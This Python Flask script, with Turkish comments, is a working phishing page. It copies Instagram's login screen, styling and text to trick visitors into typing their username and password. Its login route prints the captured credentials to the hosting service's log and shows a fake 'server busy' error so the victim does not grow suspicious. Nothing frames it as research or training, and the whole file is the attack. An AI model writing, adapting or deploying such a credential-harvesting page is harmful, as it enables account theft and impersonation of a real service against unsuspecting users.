
from flask import Flask, render_template_string, request
import os
import sys

app = Flask(__name__)

# Gelişmiş Instagram Giriş Tasarımı
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; border: 1px solid #dbdbdb; padding: 20px 40px; width: 350px; text-align: center; box-sizing: border-box; }
        h1 { font-family: 'Arial', sans-serif; font-style: italic; font-weight: bold; font-size: 35px; margin: 22px 0; }
        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; font-size: 12px; }
        button { width: 100%; padding: 8px; background-color: #0095f6; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 8px; }
        .separator { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
        .separator::before, .separator::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 15px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: bold; text-decoration: none; display: block; margin-bottom: 20px; }
        .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; display: block; margin-top: 15px; }
        .signup-container { background: white; border: 1px solid #dbdbdb; padding: 20px; width: 350px; text-align: center; margin-top: 10px; font-size: 14px; box-sizing: border-box; }
        .signup-link { color: #0095f6; font-weight: bold; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Instagram</h1>
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
        <div class="separator">YA DA</div>
        <a href="#" class="fb-login">Facebook ile Giriş Yap</a>
        <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
    </div>
    <div class="signup-container">
        Hesabın yok mu? <a href="#" class="signup-link">Kaydol</a>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pw = request.form.get('password')
    
    # Bilgileri anında Render log ekranına yazdır
    print(f"\n--- YENİ GİRİŞ GELDİ ---", file=sys.stdout)
    print(f"Kullanıcı: {user} | Şifre: {pw}", file=sys.stdout)
    sys.stdout.flush() # Veriyi logda tutma, anında göster
    
    return "Hata: Sunucu meşgul, lütfen daha sonra tekrar deneyiniz."

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
